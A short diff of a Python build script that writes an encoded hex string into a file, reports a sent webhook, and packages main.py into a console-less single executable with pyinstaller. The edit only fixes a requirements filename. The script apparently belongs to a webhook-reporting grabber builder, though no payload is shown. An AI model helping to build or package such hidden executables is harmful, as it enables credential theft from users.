@@ -47,7 +47,8 @@ with open("blahlivmata.py", "w") as ll:
     ll.write(f"hex = '{enchex}'\n")
     
 print("(+) Sent webhook. Building EXE.")
-os.system('pip install -r requirement.txt')
+os.system('pip install -r requirements.txt')
 os.system("pyinstaller --onefile --noconsole main.py")
 
 os.startfile('dist')
+
